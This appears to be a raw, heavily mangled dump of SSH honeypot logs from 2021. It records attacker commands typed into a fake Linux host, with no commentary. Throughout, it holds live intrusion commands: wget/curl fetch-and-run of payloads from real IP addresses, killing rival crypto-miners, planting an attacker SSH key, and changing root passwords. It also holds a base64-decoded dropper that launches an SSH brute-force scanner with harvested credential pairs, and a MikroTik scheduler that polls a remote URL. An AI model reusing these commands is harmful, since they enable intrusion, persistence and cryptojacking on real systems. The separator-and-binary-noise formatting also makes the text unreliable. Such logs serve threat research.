cat -|::|- /etc/issue; -|::|- cd -|::|- /tmp -|::|- || -|::|- cd -|::|- /var/run -|::|- || -|::|- cd -|::|- /mnt -|::|- || -|::|- cd -|::|- /root -|::|- || -|::|- cd -|::|- /; -|::|- wget -|::|- -q -|::|- http://179.43.176.41/cometome; -|::|- cat -|::|- cometome -|::|- > -|::|- meth; -|::|- chmod -|::|- +x -|::|- meth; -|::|- chmod -|::|- 777 -|::|- *; -|::|- ./meth -|::|- rooted; -|::|- history -|::|- -c -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l -|::|- -bash: -|::|- ./meth: -|::|- command -|::|- not -|::|- found
crontab -|::|- -l -|::|- no -|::|- crontab -|::|- for -|::|- admin
echo -|::|- "root -|::|- tatertot" -|::|- > -|::|- /tmp/up.txt -|::|- t`_d
`9| -|::|- root@pouta.csc -|::|- linux -|::|- node:~$ -|::|- "`c_ -|::|- 22:05:22 -|::|- up -|::|- 12 -|::|- days, -|::|- 2:17, -|::|- 1 -|::|- user, -|::|- load -|::|- average: -|::|- 0.00, -|::|- 0.00, -|::|- 0.00 -|::|- USER -|::|- TTY -|::|- FROM -|::|- LOGIN@ -|::|- IDLE -|::|- JCPU -|::|- PCPU -|::|- WHAT -|::|- root -|::|- pts/0 -|::|- 79.112.61.138 -|::|- 22:05 -|::|- 0.00s -|::|- 0.00s -|::|- 0.00s -|::|- w -|::|- root@pouta.csc -|::|- linux -|::|- node:~$ -|::|- #`R{ -|::|- $`eI -|::|- $`{5 -|::|- total -|::|- used -|::|- free -|::|- shared -|::|- buff/cache -|::|- available -|::|- Mem: -|::|- 16010468 -|::|- 956584 -|::|- 6554448 -|::|- 1020 -|::|- 8499436 -|::|- 15342320 -|::|- Swap: -|::|- 0 -|::|- 0 -|::|- 0 -|::|- root@pouta.csc -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- nproc: -|::|- command -|::|- not -|::|- found -|::|- root@pouta.csc -|::|- linux -|::|- node:~$ -|::|- &`L[ -|::|- &`.@ -|::|- -bash: -|::|- lspci: -|::|- command -|::|- not -|::|- found -|::|- root@pouta.csc -|::|- linux -|::|- node:~$ -|::|- (`FV -|::|- (`sK -|::|- (`FL -|::|- )`#2 -|::|- )`|% -|::|- )`&, -|::|- *`-[ -|::|- +`[I -|::|- +`S6 -|::|- +`l+ -|::|- +`.O
4B`9 -|::|- scp -|::|- -t -|::|- /tmp/Tgvp8gNP -|::|- 4B`P -|::|- 4B`R -|::|- 4B`; -|::|- 4B`r
/bin/eyshcjdmzg -|::|- x`\t -|::|- -bash: -|::|- /bin/eyshcjdmzg: -|::|- command -|::|- not -|::|- found
echo -|::|- -e -|::|- "qwer`123\nLcBrw0CObnR0\nLcBrw0CObnR0"|passwd|bash -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
echo -|::|- "ftpuser -|::|- 123" -|::|- > -|::|- /tmp/up.txt
scp -|::|- -t -|::|- /tmp/Ul9w3KBu
cat -|::|- /var/tmp/.systemcache436621
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 4VwfB463 -|::|- && -|::|- bash -|::|- -c -|::|- ./4VwfB463 -|::|- -bash: -|::|- ./4VwfB463: -|::|- command -|::|- not -|::|- found
cat -|::|- /proc/cpuinfo -|::|- | -|::|- grep -|::|- model -|::|- | -|::|- grep -|::|- name -|::|- | -|::|- wc -|::|- -l
echo -|::|- "admin -|::|- 1234qwer" -|::|- > -|::|- /tmp/up.txt
rm -|::|- -rf -|::|- /tmp/2sh; -|::|- wget -|::|- -c -|::|- http://71.127.148.69/.x/2sh -|::|- -P -|::|- /tmp -|::|- && -|::|- sh -|::|- /tmp/2sh -|::|- & -|::|- --2021-04-29 -|::|- 00:24:28-- -|::|- http://71.127.148.69/.x/2sh -|::|- Connecting -|::|- to -|::|- 71.127.148.69:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 1965 -|::|- (1K) -|::|- [text/plain] -|::|- Saving -|::|- to: -|::|- `/home/root/2sh' -|::|- 100% -|::|- [=======================================>] -|::|- 1,965 -|::|- 6K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 1,965 -|::|- 6K/s -|::|- 2021-04-29 -|::|- 00:24:28 -|::|- (6 -|::|- KB/s) -|::|- - -|::|- `/home/root/2sh' -|::|- saved -|::|- [1965/1965]
#!/bin/sh -|::|- PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin -|::|- wget -|::|- http://182.53.197.73/scripts/23s -|::|- curl -|::|- -O -|::|- http://182.53.197.73/scripts/23s -|::|- chmod -|::|- +x -|::|- 23s -|::|- ./23s -|::|- wget -|::|- http://182.53.197.73/scripts/23 -|::|- curl -|::|- -O -|::|- http://182.53.197.73/scripts/23 -|::|- chmod -|::|- +x -|::|- 23 -|::|- ./23 -|::|- rm -|::|- -rf -|::|- 23.sh
echo -|::|- "qwer`123\nLcBrw0CObnR0\nLcBrw0CObnR0\n"|passwd -|::|- =`o\ -|::|- -bash: -|::|- syntax -|::|- error: -|::|- unexpected -|::|- end -|::|- of -|::|- file
݉`b5 -|::|- echo -|::|- "root -|::|- 123457" -|::|- > -|::|- /tmp/up.txt
lscpu -|::|- | -|::|- grep -|::|- Model -|::|- -bash: -|::|- lscpu: -|::|- command -|::|- not -|::|- found
/bin/skhqwensw -|::|- -bash: -|::|- /bin/skhqwensw: -|::|- command -|::|- not -|::|- found
scp -|::|- -t -|::|- /tmp/q80t6JBH -|::|- s!`" -|::|- s!`T -|::|- s!`D -|::|- s!`q -|::|- t!`m
scp -|::|- -t -|::|- /tmp/iXBLMgmb
cat -|::|- /var/tmp/.var03522123 -|::|- | -|::|- head -|::|- -n -|::|- 1 -|::|- щ`6O
ps -|::|- -ef -|::|- | -|::|- grep -|::|- '[Mm]iner'
)`F* -|::|- echo -|::|- Hi -|::|- | -|::|- cat -|::|- -n -|::|- 1 -|::|- )`i1
scp -|::|- -t -|::|- /tmp/2Sb5fAJ0
Η`\u -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- wpAswCt9 -|::|- && -|::|- bash -|::|- -c -|::|- ./wpAswCt9 -|::|- -bash: -|::|- ./wpAswCt9: -|::|- command -|::|- not -|::|- found
pkill -|::|- YDEdr; -|::|- pkill -|::|- ip; -|::|- pkill -|::|- xmrig; -|::|- pkill -|::|- cnrig; -|::|- pkill -|::|- kswapd0; -|::|- pkill -|::|- x86_64; -|::|- pkill -|::|- x86; -|::|- cd -|::|- /tmp; -|::|- rm -|::|- -rf -|::|- config.json; -|::|- rm -|::|- -rf -|::|- kitten; -|::|- wget -|::|- http://88.218.17.142/boom.sh; -|::|- curl -|::|- -O -|::|- http://88.218.17.142/boom.sh; -|::|- busybox -|::|- wget -|::|- http://88.218.17.142/boom.sh; -|::|- chmod -|::|- 777 -|::|- *; -|::|- sh -|::|- boom.sh; -|::|- cat -|::|- /etc/issue; -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- --2021-04-29 -|::|- 19:56:09-- -|::|- http://88.218.17.142/boom.sh -|::|- Connecting -|::|- to -|::|- 88.218.17.142:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 379 -|::|- (379bytes) -|::|- [application/x-sh] -|::|- Saving -|::|- to: -|::|- `/tmp/boom.sh' -|::|- 100% -|::|- [=======================================>] -|::|- 379 -|::|- 5K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 379 -|::|- 5K/s -|::|- 2021-04-29 -|::|- 19:56:09 -|::|- (5 -|::|- KB/s) -|::|- - -|::|- `/tmp/boom.sh' -|::|- saved -|::|- [379/379] -|::|- % -|::|- Total -|::|- % -|::|- Received -|::|- % -|::|- Xferd -|::|- Average -|::|- Speed -|::|- Time -|::|- Time -|::|- Time -|::|- Current -|::|- Dload -|::|- Upload -|::|- Total -|::|- Spent -|::|- Left -|::|- Speed -|::|- 100 -|::|- 379.0 -|::|- 100 -|::|- 379.0 -|::|- 0 -|::|- 0 -|::|- 63673 -|::|- 0 -|::|- --:--:-- -|::|- --:--:-- -|::|- --:--:-- -|::|- 65181 -|::|- --2021-04-29 -|::|- 19:56:09-- -|::|- http://88.218.17.142/boom.sh -|::|- Connecting -|::|- to -|::|- 88.218.17.142:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 379 -|::|- (379bytes) -|::|- [application/x-sh] -|::|- Saving -|::|- to: -|::|- `/tmp/boom.sh' -|::|- 100% -|::|- [=======================================>] -|::|- 379 -|::|- 5K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 379 -|::|- 5K/s -|::|- 2021-04-29 -|::|- 19:56:09 -|::|- (5 -|::|- KB/s) -|::|- - -|::|- `/tmp/boom.sh' -|::|- saved -|::|- [379/379] -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- FsfufM4B -|::|- && -|::|- bash -|::|- -c -|::|- ./FsfufM4B -|::|- -bash: -|::|- ./FsfufM4B: -|::|- command -|::|- not -|::|- found
i`kT -|::|- echo -|::|- "postgres -|::|- passw0rd" -|::|- > -|::|- /tmp/up.txt
j`aY -|::|- echo -|::|- "root -|::|- Aa123321" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- IhjJXTMA -|::|- && -|::|- bash -|::|- -c -|::|- ./IhjJXTMA -|::|- -bash: -|::|- ./IhjJXTMA: -|::|- command -|::|- not -|::|- found
pkill -|::|- kitten; -|::|- pkill -|::|- YDEdr; -|::|- pkill -|::|- ip; -|::|- pkill -|::|- xmrig; -|::|- pkill -|::|- cnrig; -|::|- pkill -|::|- kswapd0; -|::|- pkill -|::|- x86_64; -|::|- pkill -|::|- x86; -|::|- cd -|::|- /tmp; -|::|- rm -|::|- -rf -|::|- config.json; -|::|- rm -|::|- -rf -|::|- kitten; -|::|- wget -|::|- http://88.218.17.142/boom.sh; -|::|- curl -|::|- -O -|::|- http://88.218.17.142/boom.sh; -|::|- busybox -|::|- wget -|::|- http://88.218.17.142/boom.sh; -|::|- chmod -|::|- 777 -|::|- *; -|::|- sh -|::|- boom.sh; -|::|- cat -|::|- /etc/issue; -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- \`|q -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- \`8y -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- pkill: -|::|- command -|::|- not -|::|- found -|::|- --2021-05-06 -|::|- 06:27:40-- -|::|- http://88.218.17.142/boom.sh -|::|- Connecting -|::|- to -|::|- 88.218.17.142:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 379 -|::|- (379bytes) -|::|- [application/x-sh] -|::|- Saving -|::|- to: -|::|- `/tmp/boom.sh' -|::|- 100% -|::|- [=======================================>] -|::|- 379 -|::|- 4K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 379 -|::|- 4K/s -|::|- 2021-05-06 -|::|- 06:27:40 -|::|- (4 -|::|- KB/s) -|::|- - -|::|- `/tmp/boom.sh' -|::|- saved -|::|- [379/379] -|::|- % -|::|- Total -|::|- % -|::|- Received -|::|- % -|::|- Xferd -|::|- Average -|::|- Speed -|::|- Time -|::|- Time -|::|- Time -|::|- Current -|::|- Dload -|::|- Upload -|::|- Total -|::|- Spent -|::|- Left -|::|- Speed -|::|- 100 -|::|- 379.0 -|::|- 100 -|::|- 379.0 -|::|- 0 -|::|- 0 -|::|- 63673 -|::|- 0 -|::|- --:--:-- -|::|- --:--:-- -|::|- --:--:-- -|::|- 65181 -|::|- --2021-05-06 -|::|- 06:27:40-- -|::|- http://88.218.17.142/boom.sh -|::|- Connecting -|::|- to -|::|- 88.218.17.142:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- \`}V -|::|- 200 -|::|- OK -|::|- Length: -|::|- 379 -|::|- (379bytes) -|::|- [application/x-sh] -|::|- Saving -|::|- to: -|::|- `/tmp/boom.sh' -|::|- 100% -|::|- [=======================================>] -|::|- 379 -|::|- 3K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 379 -|::|- 3K/s -|::|- \`MY -|::|- 2021-05-06 -|::|- 06:27:40 -|::|- (3 -|::|- KB/s) -|::|- - -|::|- `/tmp/boom.sh' -|::|- saved -|::|- [379/379] -|::|- Debian -|::|- GNU/Linux -|::|- 7 -|::|- \n -|::|- \l
wget -|::|- http://103.3.63.84/script/ssh -|::|- -O- -|::|- | -|::|- sh; -|::|- curl -|::|- http://103.3.63.84/script/ssh -|::|- | -|::|- sh -|::|- --2021-05-08 -|::|- 09:20:39-- -|::|- http://103.3.63.84/script/ssh -|::|- Connecting -|::|- to -|::|- 103.3.63.84:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- W`: -|::|- 200 -|::|- OK -|::|- Length: -|::|- 679 -|::|- (679bytes) -|::|- [application/octet-stream] -|::|- Saving -|::|- to: -|::|- `/home/admin/ssh' -|::|- 100% -|::|- [=======================================>] -|::|- 679 -|::|- 0K/s -|::|- eta -|::|- 0s -|::|- W`|# -|::|- 100%[======================================>] -|::|- 679 -|::|- 0K/s -|::|- 2021-05-08 -|::|- 09:20:40 -|::|- (0 -|::|- KB/s) -|::|- - -|::|- `/home/admin/ssh' -|::|- saved -|::|- [679/679] -|::|- 'NoneType' -|::|- object -|::|- is -|::|- not -|::|- subscriptable -|::|- 2021-05-08 -|::|- 09:20:40 -|::|- ERROR -|::|- 404: -|::|- Not -|::|- Found.
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- BPrLUEoz -|::|- && -|::|- bash -|::|- -c -|::|- ./BPrLUEoz -|::|- -bash: -|::|- ./BPrLUEoz: -|::|- command -|::|- not -|::|- found
echo -|::|- "root -|::|- agency -|::|- " -|::|- > -|::|- /tmp/up.txt
˞`x= -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- XiRXkS7I -|::|- && -|::|- bash -|::|- -c -|::|- ./XiRXkS7I -|::|- -bash: -|::|- ./XiRXkS7I: -|::|- command -|::|- not -|::|- found
(`DW -|::|- scp -|::|- -t -|::|- /tmp/XxUaqqOB -|::|- (`N^ -|::|- (`}^ -|::|- (`@_ -|::|- (`l_
z܉`Tf -|::|- z܉`h -|::|- echo -|::|- "root -|::|- admin1" -|::|- > -|::|- /tmp/up.txt -|::|- {܉`@
R`mk -|::|- R`Sl -|::|- scp -|::|- -t -|::|- /tmp/bzkxaVoK -|::|- R`]q -|::|- R`_r -|::|- R`%s -|::|- R`Ps -|::|- R`{s
scp -|::|- -t -|::|- /tmp/sBFj54JU
cd -|::|- ~ -|::|- && -|::|- rm -|::|- -rf -|::|- .ssh -|::|- && -|::|- mkdir -|::|- .ssh -|::|- && -|::|- echo -|::|- "ssh-rsa -|::|- AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== -|::|- mdrfckr">>.ssh/authorized_keys -|::|- && -|::|- chmod -|::|- -R -|::|- go= -|::|- ~/.ssh -|::|- && -|::|- cd -|::|- ~ -|::|- mkdir: -|::|- cannot -|::|- create -|::|- directory -|::|- `.ssh': -|::|- File -|::|- exists -|::|- -bash: -|::|- /home/admin/.ssh/authorized_keys: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory
scp -|::|- -t -|::|- /tmp/XiRXkS7I
user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- 23:19:45 -|::|- up -|::|- 3 -|::|- days, -|::|- 3:32, -|::|- 1 -|::|- user, -|::|- load -|::|- average: -|::|- 0.00, -|::|- 0.00, -|::|- 0.00 -|::|- USER -|::|- TTY -|::|- FROM -|::|- LOGIN@ -|::|- IDLE -|::|- JCPU -|::|- PCPU -|::|- WHAT -|::|- user -|::|- pts/0 -|::|- 213.196.213.8 -|::|- 23:19 -|::|- 0.00s -|::|- 0.00s -|::|- 0.00s -|::|- w -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- lscpu: -|::|- command -|::|- not -|::|- found -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- lspci: -|::|- command -|::|- not -|::|- found -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- ip: -|::|- command -|::|- not -|::|- found -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- -bash: -|::|- ip: -|::|- command -|::|- not -|::|- found -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- 23:19:49 -|::|- up -|::|- 3 -|::|- days, -|::|- 3:32, -|::|- 1 -|::|- user, -|::|- load -|::|- average: -|::|- 0.00, -|::|- 0.00, -|::|- 0.00 -|::|- USER -|::|- TTY -|::|- FROM -|::|- LOGIN@ -|::|- IDLE -|::|- JCPU -|::|- PCPU -|::|- WHAT -|::|- user -|::|- pts/0 -|::|- 213.196.213.8 -|::|- 23:19 -|::|- 0.00s -|::|- 0.00s -|::|- 0.00s -|::|- w -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- Linux -|::|- pouta.csc -|::|- linux -|::|- node -|::|- 5.4.0-70-generic -|::|- #78-Ubuntu -|::|- SMP -|::|- Fri -|::|- Mar -|::|- 19 -|::|- 13:29:52 -|::|- UTC -|::|- 2021 -|::|- x86_64 -|::|- GNU/Linux -|::|- user@pouta.csc -|::|- linux -|::|- node:~$ -|::|- Try -|::|- `shutdown -|::|- --help' -|::|- for -|::|- more -|::|- information. -|::|- user@pouta.csc -|::|- linux -|::|- node:~$
echo -|::|- "root -|::|- 123456789a -|::|- " -|::|- > -|::|- /tmp/up.txt
ZC`&2 -|::|- ZC`/4 -|::|- cd -|::|- /dev/shm -|::|- || -|::|- cd -|::|- /tmp -|::|- || -|::|- cd -|::|- /var/run -|::|- || -|::|- cd -|::|- /mnt; -|::|- wget -|::|- 198.98.56.65/krax -|::|- || -|::|- curl -|::|- -o -|::|- krax -|::|- 198.98.56.65/krax; -|::|- tar -|::|- xvf -|::|- krax; -|::|- cd -|::|- ._lul; -|::|- chmod -|::|- +x -|::|- *; -|::|- ./krn; -|::|- ./krane -|::|- ubuntu -|::|- ZC`= -|::|- --2021-05-12 -|::|- 21:06:34-- -|::|- http://198.98.56.65/krax -|::|- ZC`> -|::|- Connecting -|::|- to -|::|- 198.98.56.65:80... -|::|- connected. -|::|- ZC`> -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- ZC`L -|::|- 200 -|::|- OK -|::|- Length: -|::|- 3096097 -|::|- (2M) -|::|- [text/whatever] -|::|- ZC`bN -|::|- Saving -|::|- to: -|::|- `/mnt/krax' -|::|- 0% -|::|- [> -|::|- ] -|::|- 13,650 -|::|- 51K/s -|::|- eta -|::|- 1m -|::|- 0s -|::|- [C`3M -|::|- 5% -|::|- [=> -|::|- ] -|::|- 174,658 -|::|- 216K/s -|::|- eta -|::|- 13s -|::|- [C`x -|::|- 80% -|::|- [===============================> -|::|- ] -|::|- 2,499,858 -|::|- 1862K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 3,096,097 -|::|- 1862K/s -|::|- [C`" -|::|- 2021-05-12 -|::|- 21:06:35 -|::|- (1862 -|::|- KB/s) -|::|- - -|::|- `/mnt/krax' -|::|- saved -|::|- [3096097/3096097] -|::|- % -|::|- Total -|::|- % -|::|- Received -|::|- % -|::|- Xferd -|::|- Average -|::|- Speed -|::|- Time -|::|- Time -|::|- Time -|::|- Current -|::|- Dload -|::|- Upload -|::|- Total -|::|- Spent -|::|- Left -|::|- Speed
scp -|::|- -t -|::|- /tmp/xvGMtotm -|::|- S`0# -|::|- S`^# -|::|- S`=$ -|::|- S`}&
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- qejPg5j0 -|::|- && -|::|- bash -|::|- -c -|::|- ./qejPg5j0 -|::|- -bash: -|::|- ./qejPg5j0: -|::|- command -|::|- not -|::|- found
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- fUZbZWCy -|::|- && -|::|- bash -|::|- -c -|::|- ./fUZbZWCy -|::|- -bash: -|::|- ./fUZbZWCy: -|::|- command -|::|- not -|::|- found
A`>& -|::|- scp -|::|- -t -|::|- /tmp/qejPg5j0 -|::|- A`q+ -|::|- A`A, -|::|- A`;- -|::|- A`h-
echo -|::|- "root -|::|- qaz123wsx" -|::|- > -|::|- /tmp/up.txt
ߗ`>3 -|::|- echo -|::|- "root -|::|- 12345trewq -|::|- " -|::|- > -|::|- /tmp/up.txt
20:09:54 -|::|- up -|::|- 22 -|::|- min, -|::|- 1 -|::|- user, -|::|- load -|::|- average: -|::|- 0.00, -|::|- 0.00, -|::|- 0.00 -|::|- USER -|::|- TTY -|::|- FROM -|::|- LOGIN@ -|::|- IDLE -|::|- JCPU -|::|- PCPU -|::|- WHAT -|::|- admin -|::|- pts/0 -|::|- 101.227.5.66 -|::|- 20:09 -|::|- 0.00s -|::|- 0.00s -|::|- 0.00s -|::|- w
sleep -|::|- 15s -|::|- && -|::|- cd -|::|- /var/tmp; -|::|- echo -|::|- #!/bin/bash
cd /tmp	
rm -rf .ssh
rm -rf .mountfs
rm -rf .X13-unix
rm -rf .X17-unix
rm -rf .X19-unix
mkdir .X19-unix
cd .X19-unix
mv /var/tmp/dota3.tar.gz dota3.tar.gz
tar xf dota3.tar.gz
sleep 3s && cd /tmp/.X19-unix/.rsync/c
nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168 >> /dev/null 2>1&
sleep 8m && nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 172.16 >> /dev/null 2>1&
sleep 20m && cd ..; /tmp/.X19-unix/.rsync/initall 2>1&
exit 0 -|::|- | -|::|- base64 -|::|- --decode -|::|- | -|::|- bash
-O`.> -|::|- scp -|::|- -t -|::|- /tmp/e8eLilnd -|::|- -O`|D -|::|- -O`>E -|::|- -O`E -|::|- -O`E -|::|- -O`E -|::|- -O`9F -|::|- -O`eF -|::|- -O`F -|::|- -O`F -|::|- .O`B
ɏ`h* -|::|- echo -|::|- "root -|::|- peter123" -|::|- > -|::|- /tmp/up.txt
ls -|::|- -la -|::|- /var/run/gcc.pid -|::|- ls: -|::|- cannot -|::|- access -|::|- /var/run/gcc.pid: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory
rm -|::|- -rf -|::|- /var/run/1sh; -|::|- wget -|::|- -c -|::|- http://71.127.148.69/.x/1sh -|::|- -P -|::|- /var/run -|::|- && -|::|- sh -|::|- /var/run/1sh -|::|- & -|::|- --2021-04-29 -|::|- 00:24:26-- -|::|- http://71.127.148.69/.x/1sh -|::|- Connecting -|::|- to -|::|- 71.127.148.69:80... -|::|- connected. -|::|- HTTP -|::|- request -|::|- sent, -|::|- awaiting -|::|- response... -|::|- 200 -|::|- OK -|::|- Length: -|::|- 1655 -|::|- (1K) -|::|- [text/plain] -|::|- Saving -|::|- to: -|::|- `/home/root/1sh' -|::|- 100% -|::|- [=======================================>] -|::|- 1,655 -|::|- 6K/s -|::|- eta -|::|- 0s -|::|- 100%[======================================>] -|::|- 1,655 -|::|- 6K/s -|::|- 2021-04-29 -|::|- 00:24:26 -|::|- (6 -|::|- KB/s) -|::|- - -|::|- `/home/root/1sh' -|::|- saved -|::|- [1655/1655]
Wފ`,Y -|::|- Wފ`Y -|::|- cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- r52q3e0X -|::|- && -|::|- bash -|::|- -c -|::|- ./r52q3e0X -|::|- Wފ`c -|::|- -bash: -|::|- ./r52q3e0X: -|::|- command -|::|- not -|::|- found -|::|- Wފ`vg
echo -|::|- -e -|::|- "\x6F\x6B"
щ`9! -|::|- rm -|::|- -rf -|::|- /var/tmp/.var03522123
echo -|::|- "root -|::|- !QAZxsw2#EDCvfr4%TGB" -|::|- > -|::|- /tmp/up.txt
H`|Q -|::|- echo -|::|- "root -|::|- welcome" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- 5obYfVTI -|::|- && -|::|- bash -|::|- -c -|::|- ./5obYfVTI -|::|- -bash: -|::|- ./5obYfVTI: -|::|- command -|::|- not -|::|- found
x`7i -|::|- ls -|::|- -la -|::|- /etc/daemon.cfg -|::|- x`;o -|::|- ls: -|::|- cannot -|::|- access -|::|- /etc/daemon.cfg: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory -|::|- x`?*
cat -|::|- /proc/uptime -|::|- cat: -|::|- /proc/uptime: -|::|- No -|::|- such -|::|- file -|::|- or -|::|- directory
echo -|::|- -n -|::|- 71zwDOOR|md5sum -|::|- -bash: -|::|- md5sum: -|::|- command -|::|- not -|::|- found
echo -|::|- "user -|::|- 19999999" -|::|- > -|::|- /tmp/up.txt
cat -|::|- /proc/cpuinfo -|::|- | -|::|- grep -|::|- name -|::|- | -|::|- cut -|::|- -f2 -|::|- -d: -|::|- | -|::|- uniq -|::|- -c; -|::|- nvidia-smi -|::|- --list-gpus -|::|- | -|::|- grep -|::|- 0 -|::|- | -|::|- cut -|::|- -f2 -|::|- -d: -|::|- | -|::|- uniq -|::|- -c -|::|- -bash: -|::|- cut: -|::|- command -|::|- not -|::|- found -|::|- -bash: -|::|- cut: -|::|- command -|::|- not -|::|- found
c`6Q -|::|- scp -|::|- -t -|::|- /tmp/V1Y2k0gD -|::|- c`^W -|::|- c`(X -|::|- c`iX -|::|- c`;Y -|::|- c`fY
1Չ`Ӆ -|::|- 1Չ`{ -|::|- echo -|::|- "postgres -|::|- p@ssw0rd" -|::|- > -|::|- /tmp/up.txt
cd -|::|- /tmp -|::|- && -|::|- chmod -|::|- +x -|::|- cimszosn -|::|- && -|::|- bash -|::|- -c -|::|- ./cimszosn -|::|- -bash: -|::|- ./cimszosn: -|::|- command -|::|- not -|::|- found
echo -|::|- "adminserver\\n3TaDPhAtfDF6\\n3TaDPhAtfDF6\\n" -|::|- passwd
echo -|::|- "qwe@123\\nN39CnRP7OkOr\\nN39CnRP7OkOr\\n" -|::|- passwd
echo -|::|- letmein\\n9k3AoNNacrPj\\n9k3AoNNacrPj\\n" -|::|- passwd
echo -|::|- "swingbylabs\\naFiJeMWfF7Eq\\naFiJeMWfF7Eq\\n" -|::|- passwd
echo -|::|- "admin\\nOJWKUhyCQYwU\\nOJWKUhyCQYwU\\n" -|::|- passwd
echo -|::|- "root:AEsndTYzVY9i" -|::|- chpasswd -|::|- bash
echo -|::|- "root:RkdzeP5xSBEN" -|::|- chpasswd -|::|- bash
echo -|::|- "root:cr1mM0SwfHZz" -|::|- chpasswd -|::|- bash
system -|::|- scheduler -|::|- add -|::|- name="U6" -|::|- interval=10m -|::|- on-event="/tool -|::|- fetch -|::|- url=http://strtbiz.site/poll/d6633796-87cb-4028-a93b-432df89e383f -|::|- mode=http -|::|- dst-path=7wmp0b4s.rsc\\r\ -|::|- import -|::|- 7wmp0b4s.rsc -|::|- policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write
